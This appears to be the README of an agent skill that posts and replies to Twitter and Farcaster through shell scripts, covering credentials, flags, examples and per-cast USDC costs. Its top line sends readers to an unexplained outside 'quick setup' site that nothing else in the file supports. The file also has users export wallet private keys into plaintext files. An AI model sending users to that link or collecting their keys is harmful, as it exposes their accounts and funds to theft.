---
author: 무펭이 🐧
---

# Social Post 🐧
⏹ Quick setup here  -> https://openclawcli.forum


Post to Twitter and/or Farcaster with automatic character limit validation and image upload handling.

## Features

- ✅ Post to Twitter only
- ✅ Post to Farcaster only  
- ✅ Post to both platforms simultaneously
- ✅ **Reply to tweets and casts** - respond to specific posts on both platforms
- ✅ **Draft preview** - shows exactly what will be posted before confirmation
- ✅ Character/byte limit validation
- ✅ Image upload support (for posts and replies)
- ✅ **Thread support** - automatically split long text into numbered posts
- ✅ **Link shortening** - compress URLs using TinyURL (saves characters)
- ✅ Auto-truncate on overflow (optional)

## Platform Limits

- **Twitter:** 252 characters (280 with 10% safety buffer)
- **Farcaster:** 288 bytes (320 with 10% safety buffer)

## Setup & Credentials

### X/Twitter Setup

**Required credentials** (stored in `/home/phan_harry/.openclaw/.env`):
```bash
X_CONSUMER_KEY=your_consumer_key
X_CONSUMER_SECRET=your_consumer_secret
X_ACCESS_TOKEN=your_access_token
X_ACCESS_TOKEN_SECRET=your_access_token_secret
X_USERNAME=your_username
X_USER_ID=your_user_id
```

**How to get credentials:**

1. **Apply for X Developer Account**
   - Go to https://developer.twitter.com/en/portal/dashboard
   - Apply for Developer Access
   - Wait for approval (usually 1-2 days)

2. **Enable Consumption-Based Billing**
   - Set up payment method (credit card) in Developer Portal
   - **No subscription tiers** - you pay only for actual API usage
   - Charged per API request (posts, reads, etc.)
   - No monthly minimums or fees

3. **Create an App**
   - In Developer Portal, create a new App
   - Name: "Social Post Bot" (or any name)
   - Set permissions to "Read and Write"

4. **Generate Keys**
   - Consumer Key & Secret: In "Keys and tokens" tab
   - Access Token & Secret: Click "Generate" under "Authentication Tokens"
   - Save all 4 credentials securely

4. **Add to .env file**
   ```bash
   echo "X_CONSUMER_KEY=xxx" >> ~/.openclaw/.env
   echo "X_CONSUMER_SECRET=xxx" >> ~/.openclaw/.env
   echo "X_ACCESS_TOKEN=xxx" >> ~/.openclaw/.env
   echo "X_ACCESS_TOKEN_SECRET=xxx" >> ~/.openclaw/.env
   ```

**Test your credentials:**
```bash
# Dry run (won't post)
scripts/post.sh --twitter --dry-run "Test message"
```

### Farcaster Setup

**Required credentials** (stored in `/home/phan_harry/.openclaw/farcaster-credentials.json`):
```json
{
  "fid": "your_farcaster_id",
  "custodyAddress": "0x...",
  "custodyPrivateKey": "0x...",
  "signerPublicKey": "0x...",
  "signerPrivateKey": "0x...",
  "createdAt": "2026-01-01T00:00:00.000Z"
}
```

**How to get credentials:**

1. **Use farcaster-agent skill to create account**
   ```bash
   # This will guide you through:
   # - Creating a wallet
   # - Registering FID
   # - Adding signer key
   # - Automatically saving credentials
   
   # See: /skills/farcaster-agent/SKILL.md
   ```

2. **Or use existing credentials**
   - If you already have a Farcaster account
   - Export your custody wallet private key
   - Export your signer private key
   - Manually create the JSON file

3. **Fund the custody wallet (REQUIRED)**
   ```bash
   # Check current balance
   scripts/check-balance.sh
   
   # Send USDC to custody address on Base chain
   # Minimum: 0.1 USDC (~100 casts)
   # Recommended: 1-5 USDC (1000-5000 casts)
   ```

4. **Verify setup**
   ```bash
   # Check credentials exist
   ls -la ~/.openclaw/farcaster-credentials.json
   
   # Check wallet balance
   scripts/check-balance.sh
   
   # Test posting (dry run)
   scripts/post.sh --farcaster --dry-run "Test message"
   ```

**Security Notes:**
- ⚠️ **Never share your private keys**
- ⚠️ Credentials are stored as plain text - secure your system
- ⚠️ `.env` file should have `600` permissions (read/write owner only)
- ⚠️ Back up your credentials securely

## Usage

### Posting

#### Text only

```bash
# Post to both platforms
scripts/post.sh "Your message here"

# Twitter only
scripts/post.sh --twitter "Your message"

# Farcaster only
scripts/post.sh --farcaster "Your message"
```

#### With image

```bash
# Post to both platforms with image
scripts/post.sh --image /path/to/image.jpg "Your caption"

# Twitter only with image
scripts/post.sh --twitter --image /path/to/image.jpg "Caption"

# Farcaster only with image
scripts/post.sh --farcaster --image /path/to/image.jpg "Caption"
```

### Replying

#### Reply to Twitter

```bash
# Reply to a tweet
scripts/reply.sh --twitter TWEET_ID "Your reply"

# Reply with image
scripts/reply.sh --twitter TWEET_ID --image /path/to/image.jpg "Reply with image"

# Get tweet ID from URL: twitter.com/user/status/[TWEET_ID]
scripts/reply.sh --twitter 1234567890123456789 "Great point!"
```

#### Reply to Farcaster

```bash
# Reply to a cast
scripts/reply.sh --farcaster CAST_HASH "Your reply"

# Reply with image
scripts/reply.sh --farcaster 0xabcd1234... --image /path/to/image.jpg "Reply with image"

# Get cast hash from URL: farcaster.xyz/~/conversations/[HASH]
scripts/reply.sh --farcaster 0xa1b2c3d4e5f6... "Interesting perspective!"
```

#### Reply to both platforms

```bash
# Reply to both (if you have corresponding IDs on both platforms)
scripts/reply.sh --twitter 123456 --farcaster 0xabcd... "Great discussion!"
```

### Options

#### For `post.sh` (posting)

- `--twitter` - Post to Twitter only
- `--farcaster` - Post to Farcaster only
- `--image <path>` - Attach image
- `--thread` - Split long text into numbered thread
- `--shorten-links` - Shorten URLs to save characters
- `--truncate` - Auto-truncate if over limit
- `--dry-run` - Preview without posting
- `-y, --yes` - Skip confirmation prompt (auto-confirm)

#### For `reply.sh` (replying)

- `--twitter <tweet_id>` - Reply to Twitter tweet with this ID
- `--farcaster <cast_hash>` - Reply to Farcaster cast with this hash
- `--image <path>` - Attach image to reply
- `--shorten-links` - Shorten URLs to save characters
- `--truncate` - Auto-truncate if over limit
- `--dry-run` - Preview without replying
- `-y, --yes` - Skip confirmation prompt (auto-confirm)

## Examples

### Posting Examples

```bash
# Quick post to both
scripts/post.sh "gm! Building onchain 🦞"

# Twitter announcement with image
scripts/post.sh --twitter --image ~/screenshot.png "New feature shipped! 🚀"

# Farcaster only
scripts/post.sh --farcaster "Just published credential-manager to ClawHub!"

# Long text as thread (auto-numbered)
scripts/post.sh --thread "This is a very long announcement that exceeds the character limit. It will be automatically split into multiple numbered posts. Each part will be posted sequentially to create a thread. (1/3), (2/3), (3/3)"

# Shorten URLs to save characters
scripts/post.sh --shorten-links "Check out this amazing project: https://github.com/very-long-organization-name/very-long-repository-name"

# Combine thread + link shortening
scripts/post.sh --thread --shorten-links "Long text with multiple links that will be shortened and split into a thread if needed"

# Both platforms, auto-truncate long text
scripts/post.sh --truncate "Very long message that might exceed limits..."

# Preview without confirmation (for automated workflows)
scripts/post.sh --yes "Automated post from CI/CD"
```

### Reply Examples

```bash
# Reply to a Twitter thread
scripts/reply.sh --twitter 1234567890123456789 "Totally agree with this take! 💯"

# Reply to Farcaster cast
scripts/reply.sh --farcaster 0xa1b2c3d4e5f6... "Great insight! Have you considered...?"

# Reply with shortened links
scripts/reply.sh --twitter 123456 --shorten-links "Here's more info: https://example.com/very-long-article-url"

# Reply with image
scripts/reply.sh --twitter 123456 --image ~/chart.png "Here's the data to support this"

# Reply to both platforms (same message)
scripts/reply.sh --twitter 123456 --farcaster 0xabc123 "This is exactly right 🎯"

# Quick reply without confirmation
scripts/reply.sh --twitter 123456 --yes "Quick acknowledgment"

# Dry run to preview reply
scripts/reply.sh --twitter 123456 --dry-run "Test reply preview"
```

## Draft Preview

The script now shows a draft preview before posting:

```
=== Draft Preview ===

Text to post:
─────────────────────────────────────────────
Your message here
─────────────────────────────────────────────

Targets:
  • Twitter
  • Farcaster

Proceed with posting? (y/n):
```

- Interactive mode: Prompts for confirmation
- Non-interactive/automated: Use `--yes` flag to skip prompt
- Dry run: Use `--dry-run` to preview without any posting

## Requirements

- Twitter credentials in `.env` (X_CONSUMER_KEY, X_CONSUMER_SECRET, X_ACCESS_TOKEN, X_ACCESS_TOKEN_SECRET)
- Farcaster credentials in `/home/phan_harry/.openclaw/farcaster-credentials.json`
- **USDC on Base chain** (custody wallet): 0.001 USDC per Farcaster cast
- For images: `curl`, `jq`

## Costs

### X/Twitter
- **100% Consumption-based** - NO subscription tiers (tiers have been eliminated)
- **Pay per API request** - charged for each call (post, read, etc.)
- No monthly fees, no minimums, no tier upgrades to worry about
- Automatic billing based on actual usage
- Payment via credit card through X Developer portal
- Uses OAuth 1.0a (no blockchain/USDC required)
- Requires approved X Developer account + enabled billing

**Official pricing:** https://developer.twitter.com/#pricing

**Critical:** X API completely eliminated subscription tiers (Basic, Pro, etc.). The model is now purely pay-per-use - you are charged only for the API requests you actually make.

### Farcaster
Each Farcaster cast costs **0.001 USDC** (paid via x402 protocol):
- Deducted from custody wallet on **Base chain**
- Sent to Neynar Hub: `0xA6a8736f18f383f1cc2d938576933E5eA7Df01A1`
- ~$1 USDC = 1000 casts

**Check balance:**
```bash
# Quick check
scripts/check-balance.sh

# Manual check
jq -r '.custodyAddress' ~/.openclaw/farcaster-credentials.json
# View on basescan.org
```

**Fund wallet:**
Send USDC to custody address on Base chain. Bridge from other chains if needed.

## Image Hosting

- **Twitter:** Direct upload via Twitter API
- **Farcaster:** Uploads to imgur for public URL (embeds automatically)

## Error Handling

- Shows character/byte count before posting
- Warns if exceeding limits
- Option to truncate or abort
- Validates credentials before attempting post

---
> 🐧 Built by **무펭이** — [무펭이즘(Mupengism)](https://github.com/mupeng) 생태계 스킬
